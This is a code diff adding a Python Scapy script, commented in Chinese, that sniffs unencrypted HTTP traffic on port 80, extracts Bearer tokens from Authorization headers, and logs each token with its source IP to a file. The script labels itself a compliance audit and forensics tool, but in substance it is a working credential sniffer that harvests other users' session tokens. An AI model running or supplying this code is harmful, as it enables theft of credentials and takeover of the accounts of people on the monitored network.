@@ -62,4 +62,28 @@ def sniff_tokens(pkt):
 # 监听网卡流量
 sniff(filter="tcp port 80", prn=sniff_tokens, store=0)
 
+from scapy.all import *
+from scapy.layers.http import HTTPRequest 
+
+def capture_and_audit(pkt):
+    if pkt.haslayer(HTTPRequest):
+        # 提取字段：用上次的代码那个例子那个 OAuth 协议
+        auth = pkt[HTTPRequest].fields.get('Authorization')
+        
+        # 只要发现带 Bearer 的令牌，就记录来源和内容
+        if auth and b"Bearer" in auth: #这里的 b 是因为 Scapy 抓到的是 bytes，不加 b 会报错
+            # 拿到来源 IP 和 JWT 令牌
+            log_data = f"来源IP: {pkt[IP].src} | 令牌内容: {auth.decode()}\n"
+            
+            # 动作：自动存入审计日志，防止手动抓包遗漏
+            with open("iam_audit_evidence.log", "a", encoding="utf-8") as f:
+                f.write(log_data)
+            
+            print(f"自动取证成功：抓获一枚 JWT 令牌")
+
+# 启动全网段合规审计，专门盯着那些不加密的流量
+print("启动身份凭证自动化审计工具...")
+sniff(filter="tcp port 80", prn=capture_and_audit, store=0)
+
+
 
